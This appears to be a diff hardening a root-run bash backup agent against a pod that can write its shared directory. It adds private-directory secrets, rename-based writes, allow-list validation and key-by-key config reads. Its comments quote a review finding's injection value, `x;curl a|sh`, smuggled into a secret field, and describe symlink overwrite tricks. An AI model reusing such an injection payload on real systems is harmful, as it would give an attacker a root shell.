@@ -47,17 +47,36 @@
 # $BACKUP_DIR is hostPath-mounted into drive-app at /appliance-backup (root:1001
 # 0770), the same idiom update.sh and support.sh already use:
 #   state.json           written by us — read by the admin UI
+#   .key-reveal          written by us — the repository key, until acknowledged
 #   run-requested        dropped by the app -> systemd .path unit -> `run`
 #   test-requested       dropped by the app -> `test`
 #   configure-requested  dropped by the app -> `configure` (destination + retention)
 # The app never holds root and never edits backup.env itself: it asks, we
 # validate, and the credentials land in a 0600 file it cannot read back.
 #
+# THE SHARED DIRECTORY IS HOSTILE GROUND (security review, Oct 2026)
+# The pod has WRITE on $BACKUP_DIR, and a review found that enough to get root:
+#   • backup.env lived there and was `source`d by root at every run, and the
+#     configure payload's access key / secret / region were copied into it
+#     UNQUOTED and unchecked — `"secret_key": "x;curl a|sh"` was a root shell;
+#   • repo.pass, the restic cache, the lock and the restore staging directory
+#     lived there too, where the pod could replace any of them;
+#   • state.json.tmp and .key-reveal were written IN PLACE, so a symlink of that
+#     name planted by the pod made root overwrite (or chmod) any file it pointed at.
+# Hence the split below. Everything root owns is in $PRIVATE_DIR (0700, root
+# only, NOT mounted anywhere). The shared directory holds only what the pod must
+# read (state.json, .key-reveal) and what it drops (the *-requested triggers);
+# root writes into it ONLY by renaming a file prepared in $PRIVATE_DIR over the
+# destination (rename replaces a symlink instead of following it), and reads
+# from it ONLY after moving the file out of the pod's reach and checking what it
+# is. backup.env is read key by key, never executed.
+#
 # ENCRYPTION
-# restic encrypts the repository with a key held ONLY in $BACKUP_DIR/repo.pass
-# (0600) — generated at install and printed once. Lose it and the backups are
-# unreadable: that is the point of the key, and the reason a rented appliance
-# escrows it (suite366-fleet) while a sold one ships it on a card in the box.
+# restic encrypts the repository with a key held ONLY in $PRIVATE_DIR/repo.pass
+# (0600) — generated at install, or by `configure` from the UI. Lose it and the
+# backups are unreadable: that is the point of the key, and the reason a rented
+# appliance escrows it (suite366-fleet) while a sold one ships it on a card in
+# the box.
 # =============================================================================
 set -euo pipefail
 
@@ -65,24 +84,116 @@ MODE="${1:-status}"
 
 DATA_DIR="${DATA_DIR:-/opt/suite366}"
 BACKUP_DIR="${BACKUP_DIR:-$DATA_DIR/backup}"
-BACKUP_ENV="${BACKUP_ENV:-$BACKUP_DIR/backup.env}"
-PASS_FILE="${PASS_FILE:-$BACKUP_DIR/repo.pass}"
+# Root-only. Sibling of the shared directory, not inside it: the pod's mount
+# stops at $BACKUP_DIR, and $DATA_DIR itself is 0700 root.
+PRIVATE_DIR="${BACKUP_PRIVATE_DIR:-$DATA_DIR/backup-private}"
+BACKUP_ENV="${BACKUP_ENV:-$PRIVATE_DIR/backup.env}"
+PASS_FILE="${PASS_FILE:-$PRIVATE_DIR/repo.pass}"
 STATE_JSON="$BACKUP_DIR/state.json"
-LOCK_FILE="$BACKUP_DIR/.lock"
+LOCK_FILE="$PRIVATE_DIR/.lock"
 RESTIC_BIN="${RESTIC_BIN:-$DATA_DIR/bin/restic}"
 NAMESPACE="${NAMESPACE:-suite366}"
 KUBECONFIG_PATH="${KUBECONFIG_PATH:-/etc/rancher/k3s/k3s.yaml}"
+# runAsUser / the gid of the drive-app container in the chart. The uid decides
+# which trigger files are the pod's own; the gid lets it read the shared files.
+APP_UID="${APP_UID:-1001}"
 APP_GID="${APP_GID:-1001}"
 # Overridable so install-units can be exercised without root or a live systemd.
 # It is the one part of this agent that writes outside $DATA_DIR, and an untested
 # unit file is a timer that silently never fires.
 SYSTEMD_DIR="${SYSTEMD_DIR:-/etc/systemd/system}"
 
+c_b="\033[1m"; c_g="\033[32m"; c_y="\033[33m"; c_r="\033[31m"; c_0="\033[0m"
+log()  { printf "${c_g}==>${c_0} ${c_b}%s${c_0}\n" "$*"; }
+info() { printf "    %s\n" "$*"; }
+warn() { printf "${c_y}!!  %s${c_0}\n" "$*"; }
+die()  { printf "${c_r}xx  %s${c_0}\n" "$*" >&2; exit 1; }
+have() { command -v "$1" >/dev/null 2>&1; }
+
+[[ "$(id -u)" == "0" ]] || die "Run as root (sudo)."
+
+# --- the private directory ------------------------------------------------------
+ensure_private_dir() {
+  if [[ -L "$PRIVATE_DIR" || ( -e "$PRIVATE_DIR" && ! -d "$PRIVATE_DIR" ) ]]; then
+    die "$PRIVATE_DIR exists and is not a directory — refusing to use it."
+  fi
+  mkdir -p "$PRIVATE_DIR"
+  chown root:root "$PRIVATE_DIR" 2>/dev/null || true
+  chmod 0700 "$PRIVATE_DIR"
+  migrate_private_files
+}
+
+# Is this a file THIS agent wrote? A regular file (a symlink is followed by
+# every other test, which is the whole trick), owned by the uid running here,
+# and small enough to be one of ours. The size cap is what stops a pod-planted
+# multi-gigabyte "state.json" from being read into a variable.
+own_regular_file() { # own_regular_file PATH [MAX_BYTES]
+  local f="$1" max="${2:-65536}"
+  [[ ! -L "$f" && -f "$f" && -O "$f" ]] || return 1
+  (( $(stat -c %s -- "$f") <= max ))
+}
+
+# One-time move of what used to live in the shared directory, so a box that
+# already has backup.env / repo.pass there keeps working through the update that
+# brings this agent. Only a file this agent itself wrote is taken: the pod can
+# create anything in there, and migrating its file would be adopting it.
+migrate_private_files() {
+  local name src dst
+  for name in backup.env repo.pass; do
+    src="$BACKUP_DIR/$name"; dst="$PRIVATE_DIR/$name"
+    [[ -e "$src" || -L "$src" ]] || continue
+    if ! own_regular_file "$src"; then
+      warn "$src is not a file this agent wrote — removed unread."
+      rm -rf -- "$src"
+    elif [[ ! -e "$dst" ]]; then
+      mv -fT -- "$src" "$dst" && chmod 0600 "$dst"
+      info "$name moved out of the shared directory into $PRIVATE_DIR"
+    elif cmp -s -- "$src" "$dst"; then
+      rm -f -- "$src"
+    elif [[ "$name" == "repo.pass" ]]; then
+      # Two different keys is a situation to look at, not to resolve by
+      # deleting one of them: the one in use is $dst, the other may be the
+      # only way to read older snapshots.
+      warn "$src differs from $dst — left in place; this agent uses $dst."
+    else
+      rm -f -- "$src"
+    fi
+  done
+  # The restic and kubectl caches, and the old lock: nothing in them is worth
+  # keeping, and all of them were writable by the pod.
+  local stale
+  for stale in cache .cache .kube .lock; do
+    [[ -e "$BACKUP_DIR/$stale" || -L "$BACKUP_DIR/$stale" ]] && rm -rf -- "${BACKUP_DIR:?}/$stale"
+  done
+  :
+}
+
+ensure_private_dir
+
 # Destination + retention live in backup.env (written by lib/backup.sh at
-# install time, or by the host agent when the app UI configures it in lot C).
-# Sourced BEFORE the defaults below so an operator editing that file wins.
-# shellcheck disable=SC1090
-[[ -f "$BACKUP_ENV" ]] && source "$BACKUP_ENV"
+# install time, or by this agent when the app UI configures it). Read BEFORE
+# the defaults below so an operator editing that file wins — and read key by
+# key, never sourced: the file carries values that came out of a JSON payload
+# the pod wrote, and `source` would run anything they contained as root. The
+# keys are an allow-list; a quoted value (a hand-edit) loses its quotes.
+load_backup_env() {
+  own_regular_file "$BACKUP_ENV" || return 0
+  local k v
+  while IFS='=' read -r k v; do
+    case "$k" in
+      BACKUP_REPO|BACKUP_S3_ACCESS_KEY|BACKUP_S3_SECRET_KEY|BACKUP_S3_REGION|\
+      BACKUP_KEEP_DAILY|BACKUP_KEEP_WEEKLY|BACKUP_KEEP_MONTHLY|BACKUP_SCHEDULE|\
+      NAMESPACE|KUBECONFIG_PATH|RESTIC_BIN|PG_DEPLOY|MINIO_PVC) ;;
+      *) continue ;;
+    esac
+    case "$v" in
+      \"*\") v="${v#\"}"; v="${v%\"}" ;;
+      \'*\') v="${v#\'}"; v="${v%\'}" ;;
+    esac
+    printf -v "$k" '%s' "$v"
+  done < "$BACKUP_ENV"
+}
+load_backup_env
 
 BACKUP_REPO="${BACKUP_REPO:-}"
 # These three were missing, and only the FIRST configuration from the UI hit
@@ -104,12 +215,6 @@ MINIO_PVC="${MINIO_PVC:-}"
 
 export KUBECONFIG="$KUBECONFIG_PATH"
 
-c_b="\033[1m"; c_g="\033[32m"; c_y="\033[33m"; c_r="\033[31m"; c_0="\033[0m"
-log()  { printf "${c_g}==>${c_0} ${c_b}%s${c_0}\n" "$*"; }
-info() { printf "    %s\n" "$*"; }
-warn() { printf "${c_y}!!  %s${c_0}\n" "$*"; }
-die()  { printf "${c_r}xx  %s${c_0}\n" "$*" >&2; exit 1; }
-have() { command -v "$1" >/dev/null 2>&1; }
 kc()   { k3s kubectl "$@"; }
 # Same definition as lib/common.sh. Duplicated rather than sourced: backup.sh is
 # fetched and run standalone, including from a signed package, and must not
@@ -147,8 +252,6 @@ redact_repo() { # redact_repo URL
     | sed -E 's#^([A-Za-z0-9]+:)[^/@]*:[^/@]*@#\1<redacted>@#'
 }
 
-[[ "$(id -u)" == "0" ]] || die "Run as root (sudo)."
-
 ensure_backup_dir() {
   mkdir -p "$BACKUP_DIR"
   # root:APP_GID 0770, matching $DATA_DIR/updates: lot C mounts this directory
@@ -158,15 +261,55 @@ ensure_backup_dir() {
   chmod 0770 "$BACKUP_DIR"
 }
 
+# --- writing into, and reading from, the shared directory ----------------------
+# The ONLY way a file reaches the shared directory: prepared in $PRIVATE_DIR
+# (mode and owner set there, where the pod cannot see it), then renamed over
+# the destination. rename(2) replaces a symlink rather than following it, and
+# `-T` refuses to descend into a directory the pod may have put at that name.
+# Never chmod or chown a path inside the shared directory: both follow symlinks.
+publish_shared_file() { # publish_shared_file SRC_IN_PRIVATE_DIR MODE OWNER DEST
+  local src="$1" mode="$2" owner="$3" dest="$4"
+  chown "$owner" "$src" 2>/dev/null || true
+  chmod "$mode" "$src"
+  mv -fT -- "$src" "$dest"
+}
+
+# A trigger is consumed by renaming it out of the shared directory FIRST — from
+# that moment the pod can no longer swap it for something else — and only then
+# looked at. What comes back on stdout is a path in $PRIVATE_DIR that is safe
+# to read; anything that is not a small regular file owned by the pod (or by
+# root) is logged and deleted unread. The warnings go to STDERR: callers run
+# this inside $(…), and on stdout the reason would vanish into the variable.
+consume_trigger() { # consume_trigger KIND -> PATH (empty + non-zero when there is nothing to read)
+  local src="$BACKUP_DIR/$1-requested" dst="$PRIVATE_DIR/$1-requested.$$"
+  [[ -e "$src" || -L "$src" ]] || return 1
+  mv -fT -- "$src" "$dst" 2>/dev/null || { rm -rf -- "$src"; return 1; }
+  if [[ -L "$dst" || ! -f "$dst" ]]; then
+    warn "$1-requested is not a regular file — refused and removed unread." >&2
+    rm -rf -- "$dst"; return 1
+  fi
+  if [[ ! -O "$dst" && "$(stat -c %u -- "$dst")" != "$APP_UID" ]]; then
+    warn "$1-requested is owned by uid $(stat -c %u -- "$dst"), neither the app nor root — refused and removed unread." >&2
+    rm -f -- "$dst"; return 1
+  fi
+  if (( $(stat -c %s -- "$dst") > 65536 )); then
+    warn "$1-requested is larger than 64 KiB — refused and removed unread." >&2
+    rm -f -- "$dst"; return 1
+  fi
+  printf '%s' "$dst"
+}
+
 # --- restic invocation --------------------------------------------------------
 # HOME and RESTIC_CACHE_DIR are not optional. Under systemd there is no HOME,
 # and restic >= 0.19 refuses to run without a usable cache directory rather
 # than falling back to a temp one — a backup that works by hand and fails from
-# the timer is exactly the failure this avoids.
+# the timer is exactly the failure this avoids. Both point into the private
+# directory: the kubectl discovery cache and restic's index cache are files
+# root reads back, and the pod must not be the one writing them.
 restic_env() {
-  export HOME="$BACKUP_DIR"
-  export XDG_CACHE_HOME="$BACKUP_DIR/cache"
-  export RESTIC_CACHE_DIR="$BACKUP_DIR/cache"
+  export HOME="$PRIVATE_DIR"
+  export XDG_CACHE_HOME="$PRIVATE_DIR/cache"
+  export RESTIC_CACHE_DIR="$PRIVATE_DIR/cache"
   export RESTIC_REPOSITORY="$BACKUP_REPO"
   export RESTIC_PASSWORD_FILE="$PASS_FILE"
   mkdir -p "$RESTIC_CACHE_DIR"; chmod 0700 "$RESTIC_CACHE_DIR"
@@ -209,22 +352,26 @@ unconfigured_reason() {
 # instead, because a box that grew its backup agent from the update channel has
 # no terminal moment left.
 REVEAL_FILE="${REVEAL_FILE:-$BACKUP_DIR/.key-reveal}"
-reveal_pending() { [[ -s "$REVEAL_FILE" ]] && cat "$REVEAL_FILE" || true; }
+# Read back only when it is the file WE put there. The pod can rename its own
+# file to this name — a symlink to repo.pass, or to /etc/shadow — and the
+# content lands in state.json, which is 0644 in a directory the pod reads.
+reveal_pending() { own_regular_file "$REVEAL_FILE" 256 && cat "$REVEAL_FILE" || true; }
 
 # Generate the repository key if this appliance has none. Never regenerates:
 # a second key silently orphans every existing snapshot.
 ensure_key() { # ensure_key REQUESTED_BY
   has_key && return 0
   have openssl || { warn "openssl missing — cannot generate a repository key."; return 1; }
-  local key
+  local key tmp
   key="$(openssl rand -base64 32)"
   ( umask 077; printf '%s\n' "$key" > "$PASS_FILE" )
   chmod 0600 "$PASS_FILE"
   # 0640 root:app-group: readable by the pod that must display it, by nobody
-  # else, and only until it is acknowledged.
-  ( umask 027; printf '%s' "$key" > "$REVEAL_FILE" )
-  chown "root:$APP_GID" "$REVEAL_FILE" 2>/dev/null || true
-  chmod 0640 "$REVEAL_FILE"
+  # else, and only until it is acknowledged. Prepared in the private directory
+  # and renamed into place — see publish_shared_file.
+  tmp="$(mktemp "$PRIVATE_DIR/.key-reveal.XXXXXX")"
+  printf '%s' "$key" > "$tmp"
+  publish_shared_file "$tmp" 0640 "root:$APP_GID" "$REVEAL_FILE"
   log "Repository key generated (requested by ${1:-unknown})"
   warn "It is shown ONCE, in the app, to the appliance administrators, and stored"
   warn "  nowhere else (it decrypts EVERY organisation's data). Without it the"
@@ -251,7 +398,11 @@ STATE_STATUS="unknown"; STATE_ERROR=""; STATE_STARTED=""; STATE_FINISHED=""
 STATE_SNAPSHOTS="[]"; STATE_REPO_SIZE=""
 write_state_json() {
   ensure_backup_dir
-  local tmp="$STATE_JSON.tmp" cfg=false
+  # The temp file is NOT $STATE_JSON.tmp in the shared directory: a symlink of
+  # that name planted by the pod made `cat >` write through it, as root, to
+  # whatever it pointed at. It is prepared in $PRIVATE_DIR and renamed over.
+  local tmp cfg=false
+  tmp="$(mktemp "$PRIVATE_DIR/state.json.XXXXXX")"
   configured && cfg=true
   cat > "$tmp" <<EOF
 {
@@ -280,14 +431,15 @@ write_state_json() {
   "snapshots": $STATE_SNAPSHOTS
 }
 EOF
-  chmod 0644 "$tmp"; mv -f "$tmp" "$STATE_JSON"
+  publish_shared_file "$tmp" 0644 root:root "$STATE_JSON"
 }
 
 # Preserve the previous run's outcome when writing state for a reason other
 # than a run (e.g. `test`), so a connectivity check does not erase the record
-# of last night's backup.
+# of last night's backup. Only our own file is read: a state.json the pod
+# replaced is ignored, and the next write replaces it in turn.
 load_previous_state() {
-  [[ -f "$STATE_JSON" ]] || return 0
+  own_regular_file "$STATE_JSON" || return 0
   STATE_STATUS="$(sed -n 's/.*"status": *"\([^"]*\)".*/\1/p' "$STATE_JSON" | head -1)"
   STATE_STARTED="$(sed -n 's/.*"started_at": *"\([^"]*\)".*/\1/p' "$STATE_JSON" | head -1)"
   STATE_FINISHED="$(sed -n 's/.*"finished_at": *"\([^"]*\)".*/\1/p' "$STATE_JSON" | head -1)"
@@ -379,11 +531,13 @@ backup_config() {
   #
   # Nothing in there is worth restoring anyway: the key comes from the vault or
   # the card in the crate, the destination is a per-installation decision, and
-  # state.json is regenerated by the next run.
-  info "config: $DATA_DIR (excluding models/, bin/ and the backup directory)"
+  # state.json is regenerated by the next run. The private directory holds the
+  # same secrets (that is where they moved to) and is excluded for the same reason.
+  info "config: $DATA_DIR (excluding models/, bin/ and the two backup directories)"
   res backup "$DATA_DIR" \
     --exclude "$DATA_DIR/models" \
     --exclude "$BACKUP_DIR" \
+    --exclude "$PRIVATE_DIR" \
     --exclude "$DATA_DIR/bin" \
     --tag suite366 --tag config || return 1
 }
@@ -650,9 +804,11 @@ do_restore_in_place() { # do_restore_in_place SNAP ASSUME_YES FORCE DRY
   local snap="$1" assume_yes="$2" force="$3" dry="$4"
   # mktemp, not just a timestamp: two restores started in the same second would
   # otherwise share a directory, and the second would happily find the first
-  # one's extracted dump — silently restoring the wrong snapshot.
+  # one's extracted dump — silently restoring the wrong snapshot. In the private
+  # directory: what lands here is the database and the app secret in clear, and
+  # the pod had write access to where it used to be staged.
   local stage
-  stage="$(mktemp -d "$BACKUP_DIR/restore-$(date -u '+%Y%m%dT%H%M%SZ')-XXXXXX")"
+  stage="$(mktemp -d "$PRIVATE_DIR/restore-$(date -u '+%Y%m%dT%H%M%SZ')-XXXXXX")"
 
   have flock || die "flock required."
   exec 9>"$LOCK_FILE"
@@ -776,17 +932,28 @@ EOF
 
   # --- 4. AUTH_SECRET, BEFORE the data ------------------------------------------
   log "4/8  Carrying AUTH_SECRET over (before the data — see the header)"
-  local k patched=0
+  # The patch body goes through a 0600 file in the private directory, not
+  # `-p '{…}'`: an argv is readable by every process on the host for as long
+  # as kubectl runs, and this one carries the key that decrypts every
+  # organisation's stored credentials.
+  local k patched=0 patch_file
+  patch_file="$(mktemp "$PRIVATE_DIR/patch.XXXXXX")"
   for k in AUTH_SECRET NEXTAUTH_SECRET ENCRYPTION_KEY; do
     local v
     v="$(sed -n "s/^  $k: //p" "$secret_yaml" | head -1 | tr -d '[:space:]')"
     [[ -n "$v" ]] || continue
+    # A Secret's data values are base64; anything else is not a secret this
+    # agent snapshotted, and it would land verbatim inside a JSON document.
+    [[ "$v" =~ ^[A-Za-z0-9+/=]+$ ]] \
+      || { rm -f "$patch_file"; die "$k in the snapshot's secret is not base64 — STOPPING before the data lands."; }
+    printf '{"data":{"%s":"%s"}}\n' "$k" "$v" > "$patch_file"
     kc -n "$NAMESPACE" patch secret "$app_secret" --type merge \
-      -p "{\"data\":{\"$k\":\"$v\"}}" >/dev/null \
-      || die "could not patch $k into $app_secret — STOPPING before the data lands."
+      --patch-file "$patch_file" >/dev/null \
+      || { rm -f "$patch_file"; die "could not patch $k into $app_secret — STOPPING before the data lands."; }
     info "$k restored"
     patched=$((patched+1))
   done
+  rm -f "$patch_file"
   (( patched > 0 )) || die "the snapshot's secret carries no AUTH_SECRET — STOPPING before the data lands."
 
   # --- 5. database ----------------------------------------------------------------
@@ -936,20 +1103,33 @@ vllm_pg_deploy() {
     | sed -n 's|^deployment.apps/||p' | grep -- '-postgres$' | head -1 || true
 }
 
+# The key reaches curl through a header FILE (`-H @file`, curl >= 7.55), never
+# on its argv: /proc/*/cmdline is readable by every local process, and a chat
+# completion probe keeps that argv alive for up to 60 seconds. mktemp's 0600
+# is the whole protection; the file is removed as soon as curl returns.
+vllm_auth_header_file() { # vllm_auth_header_file KEY -> PATH
+  local f=""
+  f="$(mktemp)" || return 1
+  printf 'Authorization: Bearer %s\n' "$1" > "$f"
+  printf '%s' "$f"
+}
+
 # The one curl here that is NOT `-fsS`, and it has to be: `-f` turns a 401 into
 # exit 22 and throws the status code away, and the status code IS the answer.
 # `|| true` sits INSIDE the substitution so curl's own "000" survives a connect
 # failure (it prints 000 and exits 7).
 vllm_http_code() { # vllm_http_code URL KEY TIMEOUT [JSON_BODY]
-  local url="$1" key="$2" tmo="$3" body="${4:-}" code=""
+  local url="$1" key="$2" tmo="$3" body="${4:-}" code="" hdr=""
+  hdr="$(vllm_auth_header_file "$key")" || { printf '000'; return 0; }
   if [[ -n "$body" ]]; then
     code="$(curl -s -o /dev/null -m "$tmo" -w '%{http_code}' \
-              -H "Authorization: Bearer $key" -H 'Content-Type: application/json' \
+              -H "@$hdr" -H 'Content-Type: application/json' \
               --data-binary "$body" "$url" 2>/dev/null || true)"
   else
     code="$(curl -s -o /dev/null -m "$tmo" -w '%{http_code}' \
-              -H "Authorization: Bearer $key" "$url" 2>/dev/null || true)"
+              -H "@$hdr" "$url" 2>/dev/null || true)"
   fi
+  rm -f "$hdr"
   printf '%s' "${code:-000}"
 }
 
@@ -1232,8 +1412,12 @@ reconcile_and_check_vllm_db() { # reconcile_and_check_vllm_db DEEP(0|1)
 # <<< END SHARED vllm-db BLOCK <<<
 
 do_status() {
-  if [[ ! -f "$STATE_JSON" ]]; then
+  if [[ ! -e "$STATE_JSON" && ! -L "$STATE_JSON" ]]; then
     warn "no backup state yet ($STATE_JSON absent)."
+    return 1
+  fi
+  if ! own_regular_file "$STATE_JSON"; then
+    warn "$STATE_JSON is not a file this agent wrote — not reading it (the next run replaces it)."
     return 1
   fi
   cat "$STATE_JSON"
@@ -1244,24 +1428,31 @@ do_status() {
 }
 
 # --- configure (from the admin UI) ----------------------------------------------
-# The app drops a JSON payload; we validate it and own the write. Three rules
+# The app drops a JSON payload; we validate it and own the write. Four rules
 # make this safe enough to expose in a UI:
 #
-#   • the repository string is checked against a whitelist of restic backends
-#     rather than sanitised — it ends up in an environment variable read by a
-#     process running as root, and "looks harmless" is not a security property;
+#   • EVERY field is checked against an allow-list rather than sanitised — the
+#     repository against the restic backends, the credentials and the region
+#     against the character classes their providers use. They end up in a file
+#     root reads and in environment variables of a root process, and "looks
+#     harmless" is not a security property. The review that prompted this found
+#     only the repository was checked: `"secret_key": "x;curl a|sh"` went into
+#     backup.env unquoted, and backup.env was `source`d by root at the next run;
 #   • the encryption key is NEVER regenerated here. A new key silently orphans
 #     every existing snapshot, and the customer's copy of the old one becomes
 #     the only way to read backups that no longer accumulate;
-#   • the payload file is removed before anything else, so a credential does not
-#     sit in a directory the app can read for longer than one systemd tick.
-CONFIG_TRIGGER="$BACKUP_DIR/configure-requested"
+#   • the payload is moved out of the shared directory before anything else
+#     (consume_trigger), so a credential does not sit where the app can read
+#     it for longer than one systemd tick — and so the pod cannot swap the file
+#     between the check and the read;
+#   • backup.env is written with the validated values only, and read back key
+#     by key (load_backup_env) — never sourced, here or anywhere else.
 
 valid_repo() { # valid_repo STRING
   local r="$1"
   # No shell metacharacters, no whitespace: this becomes RESTIC_REPOSITORY for a
   # root process.
-  [[ "$r" =~ ^[A-Za-z0-9._:/@+-]+$ ]] || return 1
+  [[ "$r" =~ ^[A-Za-z0-9._:/@+-]{1,1024}$ ]] || return 1
   case "$r" in
     s3:*|b2:*|azure:*|gs:*|swift:*|rest:*|sftp:*|rclone:*) return 0 ;;
     /*) return 0 ;;   # a local path or a mounted NAS
@@ -1269,11 +1460,69 @@ valid_repo() { # valid_repo STRING
   esac
 }
 
+# S3 access keys and secrets (AWS, Scaleway, MinIO, Backblaze): base64-ish plus
+# the few punctuation marks providers use. No space, no quote, no `$`, no `;`.
+valid_credential() { # valid_credential STRING
+  [[ "$1" =~ ^[A-Za-z0-9/+=._-]{1,128}$ ]]
+}
+valid_region() { # valid_region STRING
+  [[ "$1" =~ ^[a-z0-9-]{1,32}$ ]]
+}
+# `requested_by` is an e-mail address or a user id, and it is only ever logged
+# and written into a comment line — but a comment is one line only as long as
+# the value cannot carry a newline or a `#`-ending trick, so it is bounded too.
+valid_requester() { # valid_requester STRING
+  [[ "$1" =~ ^[A-Za-z0-9@._+-]{1,128}$ ]]
+}
+
+# Plain KEY=value lines, written atomically in the private directory. Plain is
+# enough BECAUSE every value was validated (or came out of this same file):
+# there is no quoting layer to get wrong, and load_backup_env does no
+# unquoting beyond a hand-edit's outer quotes.
+write_backup_env() { # write_backup_env REPO ACCESS SECRET REGION KEEP_D KEEP_W KEEP_M SCHEDULE BY
+  local tmp
+  tmp="$(mktemp "$PRIVATE_DIR/backup.env.XXXXXX")"
+  {
+    printf '# Suite 366 backup destination + retention.\n'
+    printf '# Written by backup.sh from an admin-UI request at %s (by %s).\n' "$(now_utc)" "$9"
+    printf '# 0600 — carries credentials. Read key by key by backup.sh, never sourced.\n'
+    printf '%s=%s\n' \
+      BACKUP_REPO "$1" \
+      BACKUP_S3_ACCESS_KEY "$2" \
+      BACKUP_S3_SECRET_KEY "$3" \
+      BACKUP_S3_REGION "$4" \
+      BACKUP_KEEP_DAILY "$5" \
+      BACKUP_KEEP_WEEKLY "$6" \
+      BACKUP_KEEP_MONTHLY "$7" \
+      BACKUP_SCHEDULE "$8" \
+      NAMESPACE "$NAMESPACE" \
+      KUBECONFIG_PATH "$KUBECONFIG_PATH" \
+      RESTIC_BIN "$RESTIC_BIN"
+  } > "$tmp"
+  chmod 0600 "$tmp"
+  mv -fT -- "$tmp" "$BACKUP_ENV"
+}
+
+# Reject with a reason that reaches the UI (state.json) AND the journal, and
+# leave backup.env exactly as it was. The offending value is NOT echoed into
+# state.json: that file is world-readable, and what was refused may be a
+# credential someone pasted into the wrong field.
+reject_configure() { # reject_configure FIELD WHY
+  # load_previous_state FIRST: it reads the last error back, and called after
+  # the assignment it silently replaced the reason with last night's.
+  load_previous_state
+  STATE_ERROR="rejected: $1 $2"
+  write_state_json
+  die "refusing the configuration: $1 $2 — nothing was changed."
+}
+
 do_configure() {
   ensure_backup_dir
-  [[ -s "$CONFIG_TRIGGER" ]] || die "no configuration payload at $CONFIG_TRIGGER."
-  local payload; payload="$(cat "$CONFIG_TRIGGER")"
-  rm -f "$CONFIG_TRIGGER"
+  local payload_file payload
+  payload_file="$(consume_trigger configure)" \
+    || die "no configuration payload at $BACKUP_DIR/configure-requested."
+  payload="$(cat "$payload_file")"
+  rm -f -- "$payload_file"
 
   local repo access secret region keep_d keep_w keep_m sched by
   repo="$(json_get repository   <<<"$payload")"
@@ -1286,25 +1535,39 @@ do_configure() {
   keep_w="$(json_get_num keep_weekly  <<<"$payload")"
   keep_m="$(json_get_num keep_monthly <<<"$payload")"
 
-  log "Configuring the backup destination (requested by ${by:-unknown})"
-  valid_repo "$repo" || {
-    STATE_ERROR="rejected: '$repo' is not a supported restic repository"
-    load_previous_state; write_state_json
-    die "refusing '$repo' — expected s3:/b2:/azure:/gs:/swift:/rest:/sftp:/rclone: or an absolute path."
-  }
+  valid_requester "$by" || by="unknown"
+  log "Configuring the backup destination (requested by $by)"
+  valid_repo "$repo" \
+    || reject_configure repository "is not a supported restic repository (expected s3:/b2:/azure:/gs:/swift:/rest:/sftp:/rclone: or an absolute path)"
+  # An empty credential means "keep the one already configured" — the UI shows
+  # a masked field and must not have to round-trip a credential to change a
+  # schedule. A NON-empty one is accepted only when it is shaped like one.
+  [[ -z "$access" ]] || valid_credential "$access" \
+    || reject_configure access_key "contains characters an S3 access key never has"
+  [[ -z "$secret" ]] || valid_credential "$secret" \
+    || reject_configure secret_key "contains characters an S3 secret key never has"
+  [[ -z "$region" ]] || valid_region "$region" \
+    || reject_configure region "is not a region name (lowercase letters, digits, dashes)"
   [[ "$sched" =~ ^[0-2][0-9]:[0-5][0-9]$ ]] || sched="$BACKUP_SCHEDULE"
-  [[ "$keep_d" =~ ^[0-9]+$ ]] || keep_d="$BACKUP_KEEP_DAILY"
-  [[ "$keep_w" =~ ^[0-9]+$ ]] || keep_w="$BACKUP_KEEP_WEEKLY"
-  [[ "$keep_m" =~ ^[0-9]+$ ]] || keep_m="$BACKUP_KEEP_MONTHLY"
+  # json_get_num only ever yields digits; the bound keeps the number inside
+  # what bash arithmetic and restic's --keep-* accept.
+  [[ "$keep_d" =~ ^[0-9]{1,6}$ ]] || keep_d="$BACKUP_KEEP_DAILY"
+  [[ "$keep_w" =~ ^[0-9]{1,6}$ ]] || keep_w="$BACKUP_KEEP_WEEKLY"
+  [[ "$keep_m" =~ ^[0-9]{1,6}$ ]] || keep_m="$BACKUP_KEEP_MONTHLY"
   # Retaining nothing would let the first prune delete every snapshot.
   (( keep_d < 1 )) && keep_d=1
 
-  # An empty secret means "keep the one already configured" — the UI shows a
-  # masked field and must not have to round-trip a credential to change a
-  # schedule.
   [[ -z "$access" ]] && access="$BACKUP_S3_ACCESS_KEY"
   [[ -z "$secret" ]] && secret="$BACKUP_S3_SECRET_KEY"
   [[ -z "$region" ]] && region="$BACKUP_S3_REGION"
+  # The stored values came out of backup.env, which an operator may edit by
+  # hand. They are written back as they are: the file is never executed, so
+  # nothing in them can run — but they must stay one line each, or the next
+  # key-by-key read would split them.
+  local kept
+  for kept in "$access" "$secret" "$region"; do
+    [[ "$kept" != *$'\n'* ]] || reject_configure backup.env "holds a stored value spanning several lines"
+  done
 
   # A destination with no key cannot back up anything, and the admin standing
   # in front of the UI right now is the only person who will ever be offered
@@ -1312,25 +1575,7 @@ do_configure() {
   ensure_key "$by" || warn "no repository key — backups will not run until one exists."
 
   local previous="$BACKUP_REPO"
-  ( umask 077
-    cat > "$BACKUP_ENV" <<ENV
-# Suite 366 backup destination + retention.
-# Written by backup.sh from an admin-UI request at $(now_utc) (by ${by:-unknown}).
-# 0600 — carries credentials.
-BACKUP_REPO=$repo
-BACKUP_S3_ACCESS_KEY=$access
-BACKUP_S3_SECRET_KEY=$secret
-BACKUP_S3_REGION=$region
-BACKUP_KEEP_DAILY=$keep_d
-BACKUP_KEEP_WEEKLY=$keep_w
-BACKUP_KEEP_MONTHLY=$keep_m
-BACKUP_SCHEDULE=$sched
-NAMESPACE=$NAMESPACE
-KUBECONFIG_PATH=$KUBECONFIG_PATH
-RESTIC_BIN=$RESTIC_BIN
-ENV
-  )
-  chmod 0600 "$BACKUP_ENV"
+  write_backup_env "$repo" "$access" "$secret" "$region" "$keep_d" "$keep_w" "$keep_m" "$sched" "$by"
   info "destination: $(redact_repo "$repo")"
   if [[ -n "$previous" && "$previous" != "$repo" ]]; then
     warn "the destination CHANGED (was $(redact_repo "$previous"))."
@@ -1339,9 +1584,8 @@ ENV
     warn "  they remain readable from there."
   fi
 
-  # Re-read, re-arm (the schedule may have moved), then prove it works.
-  # shellcheck disable=SC1090
-  . "$BACKUP_ENV"
+  # Re-read (key by key), re-arm (the schedule may have moved), then prove it works.
+  load_backup_env
   BACKUP_SCHEDULE="$sched"
   install_units
 
@@ -1357,18 +1601,28 @@ ENV
 # One entry point for every trigger the app can drop, so there is one place that
 # consumes the file and one place that records the outcome.
 handle_trigger() { # handle_trigger KIND
-  local kind="${1:-}"
+  local kind="${1:-}" f
   case "$kind" in
